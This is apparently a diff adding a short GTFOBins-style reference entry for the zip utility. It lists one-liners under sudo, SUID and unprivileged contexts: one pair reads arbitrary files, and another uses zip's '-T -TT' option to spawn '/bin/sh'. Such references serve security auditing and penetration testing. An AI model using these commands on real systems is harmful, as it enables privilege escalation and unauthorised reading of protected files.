@@ -1,0 +1,29 @@
+zip
+===
+
+File read
+---------
+
+[Sudo]
+    zip /path/to/temp-file /path/to/input-file
+unzip -p /path/to/temp-file
+
+[SUID]
+    zip /path/to/temp-file /path/to/input-file
+unzip -p /path/to/temp-file
+
+[Unprivileged]
+    zip /path/to/temp-file /path/to/input-file
+unzip -p /path/to/temp-file
+
+Shell
+-----
+
+[Sudo]
+    zip /path/to/temp-file /etc/hosts -T -TT '/bin/sh #'
+
+[SUID]
+    zip /path/to/temp-file /etc/hosts -T -TT '/bin/sh #'
+
+[Unprivileged]
+    zip /path/to/temp-file /etc/hosts -T -TT '/bin/sh #'
